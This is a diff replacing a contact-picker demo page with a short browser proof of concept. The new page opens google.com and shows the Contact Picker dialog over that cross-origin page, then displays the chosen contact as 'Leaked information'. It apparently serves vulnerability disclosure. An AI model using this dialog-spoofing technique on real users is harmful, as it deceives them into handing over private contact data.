@@ -1,200 +1,28 @@
-
 <!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Contact Picker PoC</title>
-
-<style>
-* {
-    box-sizing: border-box;
-}
-
-body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: #fff;
-}
-
-.page {
-    padding: 30px;
-    text-align: center;
-}
-
-button {
-    border: none;
-    padding: 13px 22px;
-    border-radius: 8px;
-    background: #1677ff;
-    color: white;
-    font-size: 16px;
-    cursor: pointer;
-}
-
-button:disabled {
-    opacity: .5;
-}
-
-.overlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,.65);
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-}
-
-.dialog {
-    width: 92%;
-    max-width: 420px;
-    padding: 25px;
-    border-radius: 28px;
-    background: #f8f7fc;
-    color: #202127;
-}
-
-.header {
-    display: flex;
-    align-items: center;
-    gap: 14px;
-    font-size: 25px;
-    margin-bottom: 25px;
-}
-
-.avatar {
-    width: 56px;
-    height: 56px;
-    border-radius: 50%;
-    background: #555;
-    color: white;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.demo {
-    font-size: 11px;
-    color: #777;
-    margin-top: 5px;
-}
-
-.number {
-    font-size: 18px;
-    color: #555;
-    margin: 15px 0;
-    overflow-wrap: anywhere;
-}
-
-.actions {
-    display: flex;
-    justify-content: flex-end;
-    gap: 10px;
-    margin-top: 35px;
-}
-
-.close {
-    background: transparent;
-    color: #2874ad;
-}
-
-.continue {
-    background: #2874ad;
-}
-</style>
-</head>
-
-<body>
-
-<div class="page">
-    <h2>Contact Picker PoC</h2>
-    <p>Local contact selection test.</p>
-    <button id="start">Select Contact</button>
-</div>
-
-<div class="overlay" id="overlay">
-    <div class="dialog">
-
-        <div class="header">
-            <div class="avatar">S</div>
-            <div>
-                Spoof Contact
-                <div class="demo">WEB DEMO · NOT SYSTEM UI</div>
-            </div>
-        </div>
-
-        <div id="numbers"></div>
-
-        <div class="actions">
-            <button class="close" id="close">Tutup</button>
-            <button class="continue" id="continue">
-                Continue to Google
-            </button>
-        </div>
-
-    </div>
-</div>
-
-<script>
-const start = document.getElementById("start");
-const overlay = document.getElementById("overlay");
-
-start.addEventListener("click", async () => {
-
-    if (!("contacts" in navigator)) {
-        alert("Contact Picker tidak didukung browser.");
-        return;
-    }
-
-    start.disabled = true;
-
-    try {
-        const contacts = await navigator.contacts.select(
-            ["name", "tel"],
-            { multiple: true }
-        );
-
-        if (!contacts.length) {
-            start.disabled = false;
-            return;
-        }
-
-        const numbers = contacts.flatMap(
-            contact => contact.tel || []
-        );
-
-        const container = document.getElementById("numbers");
-        container.replaceChildren();
-
-        if (!numbers.length) {
-            container.textContent = "Nomor tidak tersedia";
-        } else {
-            numbers.forEach(number => {
-                const item = document.createElement("div");
-                item.className = "number";
-                item.textContent = number;
-                container.appendChild(item);
-            });
-        }
-
-        overlay.style.display = "flex";
-
-    } catch (error) {
-        console.error(error);
-    } finally {
-        start.disabled = false;
-    }
-});
-
-document.getElementById("close").onclick = () => {
-    overlay.style.display = "none";
-};
-
-document.getElementById("continue").onclick = () => {
-    window.location.replace("https://www.google.com");
-};
-</script>
-
-</body>
+<html lang="en">
+    <head>
+        <title>PoC</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    let contacts = await navigator.contacts.select(["name"], {});
+                    document.write(`
+                        <h1>
+                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
+                        </h1>
+                    `);
+                })();
+                open("https://www.google.com", "PoC", "_blank");
+            }
+        </script>
+    </head>  
+    <body>
+        <br><br><br>
+        <center>
+            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
+        </center>
+    </body>
+  </body>
 </html>
